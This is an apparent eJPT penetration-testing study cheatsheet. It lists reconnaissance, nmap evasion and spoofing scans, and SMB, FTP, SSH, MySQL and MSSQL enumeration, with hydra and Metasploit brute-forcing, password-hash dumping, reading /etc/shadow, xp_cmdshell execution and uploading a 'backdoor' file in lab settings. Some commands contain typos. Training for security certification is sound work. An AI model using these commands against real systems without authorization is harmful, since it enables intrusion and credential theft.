

--------------------------------------------------------------------------------------------------

# eJPT-Cheatsheet  
This is a Cheatsheet for eJPT Exam & Course.

## (A)  Assessment Methodologies

### 1. Assessment Methodologies: Information Gathering
```
host hackersploit.org
https://hackersploit.org/robots.txt
https://hackersploit.org/sitemap_index.xml
whatweb hackersploit.org
whois hackersploit.org

https://sitereport.netcraft.com/    #looking details (website footprinting)
dnsrecon -d hackersploit.org
https://dnsdumpster.com/
wafw00f -l  #firewall detection
wafw00f sliate.ac.lk
wafw00f sliate.ac.lk -a

sublist3r -d sliate.ac.lk -e google,yahoo,big
sublist3r -d ine.com

site:ine.com
site:ine.com inurl:admin
site:ine.com inurl:forum
site:*.ine.com
site:*.ine.com intitle:admin
site:*.ine.com filetype:pdf
site:*.ine.com employees
site:*.ine.com instructors
intitle:index of
cache:ine.com
inurl:auth_user_file.txt
inurl:passwd.txt
site:gov.* intitle:"index of" *.css
https://www.exploit-db.com/google-hacking-database
https://archive.org/web/ # waybackmachine

Email Harvesting
----------------
https://github.com/laramies/theHarvester
theHarvester -d example.com -l 100 -b all
theHarvester -d example.com -b 100 -b google,yahoo
have i been pwned?  # password data bridge

DNS
---
A - Resolves a hostname or domain to an IPV4 address
AAAA - Resolves a hostname or domain to an IPv6 address
NS - Reference to the domains nameserver
MX - Resolves a domain to a mail server
CNAME - Used for domain aliases
TXT - Text record
HINFO -Host information
SOA -Domain authority
SRV - Service records
PTR - Resolves an IP address to a hostname

dnsrecon -d sliate.ac.lk
dnsrecon -d zonetransfer.me
dnsenum --help
cat /etc/hosts  --> 192.168.8.1 router.admin
dnsenum zonetransfer.me
dig axfr@sip.zonetransfer.me zonetransfer.me

ip a s
sudo nmap -sn 192.168.8.0/24
sudo netdiscover   -r  192.168.8.0/24

nmap  192.168.8.10        // windows firewall block
nmap -Pn 192.168.8.10
nmap -Pn -p- 192.168.8.10
nmap -Pn -F 192.168.8.10  // fast scan
nmap -Pn -p1-10000 192.168.8.10
nmap -Pn -sU 192.168.8.10 // UDP 
nmap -Pn 192.168.8.10 -v
nmap -Pn -F 192.168.8.10 -oN nmap_re.txt
nmap -Pn -T4 -F 192.168.8.10 -oX nmap_re.xml
```
### 2. Assessment Methodologies: Footprinting & Scanning
```
netstat -antp // for linux
netstat -ano // for windows
ipcalc -v 192.168.8.134

ping -c 5 10.10.34.111 // for linux
ping -n 5 10.10.34.111 // for windows
ping -b -c 5 10.10.34.0 // broadcast

fping -a -g 10.10.23.0/24
fping -h
fping -a -g 10.10.23.0/24 2>/dev/null
nmap -Pn 10.10.24.111
nmap -sn 10.10.24.111

Host Discovery with Nmap
.......................
nmap -sn 192.168.1.1
nmap -h
/-sn
nmap -sn 10.10.1.0-254
nmap -sn 10.10.1.0/24
sudo wireshark -i eth1
nmap -sn 10.10.1.0/24 --send-ip

nmap -sn 10.4.23.227 10.10.34.54
nmap -sn 10.4.23.227-240
nmap -sn -iL target.txt
nmap -sn -PS 10.10.34.32 (syn/ack response)
nmap -sn -PS1-10000 10.10.34.32 #port 
nmap -sn -PS3389 10.10.34.2
nmap -PS80,3389,445 10.23.45.21

nmap -sn -PA 10.10.34.54 #ACK
nmap -sn -PA1-1000- 10.10.34.43
nmap -sn -PE 10.10.34.32 --send -ip #ICMP
nmap -sn -v -T4 10.10.23.43
nmap -sn -PS21,25,80,445,3389,8080 -T4 10.10.45.32
nmap -sn -PS21,25,80,445,3389,8080 -PU137,138-T4 10.10.45.32
----------------------------------------------------------------

nmap -Pn -sV -p80 10.10.23.3
nmap -Pn -F 10.10.23.3
nmap -F 127.0.0.1  #firewall local system
nmap -T4 -Pn -sS -F 10.10.23.3 # without root user
nmap -Pn -sT 10.10.23.3

nmap -sn 192.168.214.0/24  // find target
nmap -sS 192.168.214.3nmap -sn 192.168.214.04 
ip a s
nmap -T4 -sS -p- 192.168.214.3
nmap -T4 -sS -sV -O -p- 192.168.214.3
nmap -T4 -sS -sV -O --osscan-guess -p- 192.168.214.3
nmap -T4 -sS -sV -O -- version-intensity 8 -O --osscan-guess -p- 192.168.214.3


ls -al /usr/share/nmap/scripts/ | grep -e "ftp"
ls -al /usr/share/nmap/scripts/
ls -al /usr/share/nmap/scripts/ | grep -e "http"
ls -al /usr/share/nmap/scripts/ | grep -e "mongodb"
nmap --script-help=mongodb-databases
nmap --script-help=mongodb-info
nmap -sS -sV --script=mongodb-info -p- -T4 10.10.23.3
nmap --script-help=memcached-info
nmap -sS -sV --script=memcached-info,ftp-anon -p- -T4 192.224.77.3
nmap -sS -sV --script=ftp-anon -p55413 -T4 192.224.77.3
nmap -sS -sV --script=ftp-* -p55413 -T4 192.168.77.3
nmap -sS -sV --script=ftp-syst -p- -T4 192.224.77.3
nmap -sS -A -p- -T4 10.20.4.32
nmap -sS -sV --script=mongodb-info -p- -T4 10.2.43.2

-----------------------------------------------------------

nmap -sn 10.10.34.4
nmap -Pn -sS -F 10.20.21.2
nmap -Pn -sA -p445,3389 10.20.21.2

note-->
nmap -h firewall/ids evasion and spoofing
nmap -Ps -sS -sV -F 10.10.32.32
nmap -Ps -sS -sV -p80,445,3389 -F -f 10.10.32.32 // fragment
nmap -Ps -sS -sV -p80,445,3389 -F -f --mtu 8 10.10.32.32
nmap -Pn -sS -sV -p445,3389 -f --data-length 200 -D 10.10.32.1 ,10.10.23.2 10.32.45.4    // spoof ip addre
nma -Pn -sS -sV -p445,3389 -f --data-length 200 -g 53 -D 10.10.2.1,10.32.45.4 10.34.2.45 //53 port comming from

------------------------------------------------------------------------------------------------------------------------------

nmap -Pn -sS -F --host-timeout 5s 10.10.34.0/24
nmap -sS -sP -f --scan-delay 5s  10.10.34.0/24
nmap -sS -T1 -sP -f --scan-delay 5s  10.10.34.0/24
------------------------------------------------------------------------------------------------------------------------------

service postgresql start && msfconsole
workspace -h
workspace -a pentest
db_status
db_import nmap_xml.xml
hosts
services
db_nmap -Pn -sS -sS -O -p445 10.10.19.132
```

### 3. Assessment Methodologies: Enumeration
```
nmap -T4 10.10.30.0/20 --open
net use Z: \\10.0.26.208\C$ smbserver_771 /user:administrator
net use * /delete //deleting

nmap -T4 10.10.30.0/20 --open
net use * /delete //deleting 

net use Z: \\10.0.26.208\C$ smbserver_771 /user:administrator

smb
---
nmap -p445 --script smb-protocols 10.10.32.2
nmap -p445 --script smb-security-mode 10.10.32.2
nmap -p445 --script smb-enum-sessions 10.10.32.2
nmap -p445 --script smb-enum-sessions --script-args 10.10.32.2
nmap -p445 --script smb-enum-sessions --script-args smbusername=administrator,smbpassword=smbserver_771 10.10.32.2

nmap -p445 --script smb-enum-shares 10.10.32.2 
\\10.10.32.43\IPC
nmap -p445 --script smb-enum-shares --script-args smbusername=administrator,smbpassword=smbusers_771 10.10.32.45
nmap -p445 --script smb-enum-users --script-args smbusername=administrator,smbpassword=smbserver_771 10.10.32.45
nmap -p445 --script smb-server-stats --script-args smbusername=administrator,smbpassword=smbserver_771 10.10.32.45

nmap -p445 --script smb-enum-domain --script-args smbusername=administrator,smbpassword=smbserver_771 10.10.32.45

nmap -p445 --script smb-enum-groups --script-args smbusername=administrator,smbpassword=smbserver_771 10.10.32.45

nmap -p445 --script smb-enum-services --script-args smbusername=administrator,smbpassword=smbserver_771 10.10.32.45

nmap -p445 --script smb-enum-share,smb-ls --script-args smbusername=administrator,smbpassword=smbserver_771 10.10.32.45


smb map

ping 10.4.26.58
nmap -p445 --script smb-protocols 10.4.26.58
smbmap -u guest -p "" -d . -H 10.4.26.58 // null sessions
smbmap -u administrator -p smbserver_771 -d . -H 10.4.26.58
smbmap -H 10.4.26.58 -u administrator -p smbserver_771 -x 'ipconfig'
smbmap -H 10.4.26.58 -u Administrator -p 'smbserver_771' -L
smbmap -H 10.4.26.58 -u Administrator -p 'smbserver_771' -r 'c$'
touch backdoor
smbmap -H 10.4.26.58 -u Administrator -p 'smbserver_771' --upload '/root/backdoor' 'c$\backdoor' //upload file
smbmap -H 10.4.26.58 -u Administrator -p 'smbserver_771' --download 'c$\flag.txt' //download file

ip a
nmap -sV -p139,445 192.168.43.3
nmap -sU --top-port 25 --open 192.168.43.3
nmap -sV -p445 --script smb-os-discovery 192.168.43.3

msfconsole
use auxiliary/scanner/smb/smb_version
show options
set RHOSTS 192.168.43.3
options
exploit
exit

nmblookup -h
nmblookup -A 192.168.43.3
smbclient -h
smbclient -L 192.168.34.3 -N //null sessions
rpcclient -h
rpcclient -U "" -N 192.168.34.3
?

rpcclient -U "" -N 192.168.32.3
srvinfo //server info
enum4linux -h
enum4linux -o 192.168.32.3
smbclient -L 192.168.32.3 -N

nmap -p 445 --script smb-protocls 192.168.32.3

msfconsole
use auxiliary/scanner/smb/smb2
set RHOST 192.168.32.3 
options
run

nmap -p445 --script smb-enum-users 192.168.32.3 
enum4linux -U 192.168.32.3 
rpcclient -U "" -N 192.168.32.3 
enumdomusers
lookupnames admin

nmap -p445 smb-enum-shares 192.168.23.3
nmap -p445 --script smb-enum-shares 192.168.23.3

msfconsole
use auxiliary/scanner/smb/smb-enumshares
set RHOSTS 192.168.23.3
show options
run

enum4linux -S 192.168.23.3
smbclient -L 192.168.23.3
enum4linux -G 192.168.23.3

rpcclient -U "" -N 192.168.23.3
enumdomgroups

enum4linux -i 192.168.23.3
smbclient //192.168.23.3/public -N
help
ls
get flag //download
cat flag

ip a
msfconsole
use auxiliary/scanner/smb/smb-login
info
options
set RHOSTS 192.168.23.3
set PASS_FILE /usr/share/wordlist/metasploit/unix_password.txt
set smbuser jane
options
run

gzip -d /usr/share/wordlist/rockyou.txt.gz
hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.23.3 smb
smbmap -H 192.168.23.3 -u admin -p password1
smbclient -L 192.168.23.3 -U jane
smbclient //192.168.23.3/jane -U jane
smbclient //192.168.23.3/admin -U admin
get flag.tar.gz
exit
tar -xf flag.tar.gz
ls

msfconsole
use auxiliary/scanner/smb/pipe-auditor
set smbuser admin
set smbpass password1
set RHOSTS 192.168.23.3
options
run
exit

enum4linux -r -u "admin" -p "password1" 192.168.23.3 //looking for users
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------

FTP
ftp 192.168.157.3
hydra -L /usr/share/metasploit-framework/data/wordlist/common_user.txt -p /usr/share/matasploit-framework/data/wordlist/unix_pass.txt 192.168.157.3 ftp

ftp 192.168.157.3 //give username, passwd
ls
help
get secret.txt
bye
ls
cat secret.txt

echo "sysadmin" >users
cat users

nmap --script ftp-brute --script-args userdb=/root/users -p21 192.168.157.3

nmap -p21 --script ftp-anon 192.168.157.3
ftp 192.168.157.3
get flag
bye
cat flag
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------

SSH
---
ssh root@192.168.23.3
nc 192.168.23.3 //banner 

nmap -p22 --script ssh2-enu-algos 192.168.23.3
nmap -p22 --script ssh-hostkey --script-args ssh_hostkey=full 192.168.23.3
nmap -p22 --script ssh-auth-methods --script-args="ss.user=student" 192.168.23.3
nmap -p22 --script ssh-auth-methods --script-args="ss.user=admin" 192.168.23.3
ssh student@192.168.23.3

gzip -d /usr/share/wordlists/rockyou.txt.gz
hydra -l student -P /usr/share/wordlist/rockyou.txt 192.168.23.3
ssh student@192.168.23.3
echo "administrator"> user
nmap -p22 --script ssh-brute --script-args userdb=/root/user 192.168.23.3
msfconsole
use auxiliary/scanner/ssh/ssh_login
show options
set RHOSTS 192.168.23.3
set userpass_file /usr/share/wordlist/metasploit/root_userpass.txt
set STOP_ON_SUCCESS true
set verbose true
options
run
exit
ssh root@192.168.23.3
ls /
------------------------------------------------------------------------------------------------------------------------------
HTTP
whatweb 10.4.19.11
dirb http://10.4.19.11
http 10.4.19.11
browsh --startup-url http://10.4.19.11/default.aspx

nmap 10.4.19.11 -p80 --script http-enum
nmap 10.4.19.11 -p80 --script http-headers
nmap 10.4.19.11 -p80 --script http-methods --script-args http-methods url-path=/webdav/
nmap 10.4.19.11 -p80 --script http-webdev-scan --script-args http-methods.url-path=/webdev/

nmap 10.4.19.11-sV -p80 --script http-enum
nmap 10.4.19.11-sV -p80 --script http-headers
nmap 10.4.19.11-sV -p80 --script http-methods --script-args http-methods-url-path=/webdav/
nmap 10.4.19.11-sV -p80 --script http-webdev-scan --script-args http-methods url-path=/webdav/

http Apache

nmap 10.4.19.11-sV -p80 --script banner
msfconsole
use auxiliary/scanner/http/http-version
set RHOSTS 10.10.32.3
option
run

curl 10.4.19.11 | more
wget "http://10.10.32.3/index" //web files
browsh --startup-url 10.4.19.11
lynx http://10.10.32.3


msfconsole
use auxiliary/scanner/http/brute_dirs
show options
set RHOSTS 10.23.2.3
options
run


curl http://192.168.43.2/cgi-bin/ | more  // cgi-bin need to find msfconsole the file name might be diffrent

------------------------------------------------------------------------------------------------------------------------------
mysql

mysql -h 192.168.234.3 -u root
show databases;
use books;
select count(*)from authors;
select * from authors;


msfconsole
use auxiliary/scanner/mysql/mysql_writable_dirs
options
set dir_list /usr/share/metasploit-framework/data/wordlist/directory.txt
setg RHOSTS 192.168.234.3
set verbose false
advanced
set password ""
options
run


use auxiliary/scanner/mysql/mysql_hashdump
options
set username root
set password ""
options
run

mysql -h 192.168.250.3 -u root
select load_file("/etc/shadow")
nmap 192.168.34.3 -sV -p 3306 --script=mysql-empty-password
nmap 192.168.34.3 -sV -p 3306 --script=mysql-info
nmap 192.168.34.3 -sV -p 3306 --script=mysql-users --script-args="mysqluser='root',mysqlpass=''"
nmap 192.168.34.3 -sV -p 3306 --script=mysql-databases --script-args="mysqluser='root', mysqlpass=''"
nmap 192.168.34.3 -sV -p 3306 --script=mysql-variables --script-args="mysqluser='root', mysqlpass=''"

nmap 192.168.34.3 -sV -p 3306 --script=mysql-audit --script-args="mysql-audit.username='root',mysql-audit.password='',
mysql-audit.filename='/usr/share/nmap/nselib/data/mysql-cis.audit'"

nmap 192.168.34.3 -sV -p 3306 --script=mysql-dump-hashes --script-args="username='root',password=''"
nmap 192.168.34.3 -sV -p 3306 --script=mysql-query --script-args="query='select count(*) from books.authors;',username='root',
password=''"


mysql dictionary attack
----------------------

msfconsole
use auxiliary/scanner/mysql/mysql_login
set RHOSTS 192.168.3.3
set pass_file/usr/share/metasploit-framework/data/wordlists/unix_pass.txt
set verbose false
set stop_on_success true
set username root
run

hydra -l root -P /usr/share/metasploit-framework/data/wordlists/unix_password.txt 192.168.34.3 mysql

nmap -p 1433 --script ms-sql-info 192.168.4.3

nmap -p 1433 --script ms-sql-ntlm-info --script ms-sql-brute --script-args userdb=/root/Desktop/wordlist/common_users.txt
,passdb=/root/Desktop/wordlist/100-common-passwords.txt 192.168.4.3 

nmap -p 1433 --script ms-sql-empty-password 192.168.4.3

nmap 10.4.25.137 -p 1433 --script ms-sql-query --script-args mssql.unsername=admin,mssql.password=anamaria,ms-sql-query.query
"SELECT *FROM master..syslogins" -oN output.txt


nmap 10.10.34.3 -p1433 --script ms-sql-dump-hashes --script-args mssql.username=admin,mssql.password=anamaria
nmap 10.4.25.3 -p1433 --script ms-sql-xp-cmdshell --script-args mssql.username=admin, mssql.password=anamaria, ms-sql-cmdshell.cmd
="ipconfig"

nmap 10.4.25.3 -p1433 --script ms-sql-xp-cmdshell --script-args mssql.username=admin, mssql.password=anamaria, ms-sql-cmdshell.cmd
="type c:\flag.txt"

nmap -sV -p1433--script mssql-sql-info 10.23.21.2
msfconsole
use auxiliary/scanner/mssql/mssql_login
setg RHOSTS 10.45.33.2
set user_file /root/Desktop/wordlist/common_users.txt
set pass_file /root/Desktop/wordlist/100-common-passwordds.txt
set verbose false
option
run


use auxiliary/scanner/mssql/mssql_enum
option
run
use auxiliary/scanner/admin/mssql/mssql_enum_sql_logins
exploit
use auxiliary/scanner/admin/mssql/mssql_exec
set cmd whoami
option
run

use auxiliary/scanner/admin/mssql/mssql_enum_domain_accounts
run
 






































```

## (B) Host & Networking Auditing
```

```

## (C) Host & Network Penetration Testing

```
```
## (D) Web Application Penetration Testing

```
```
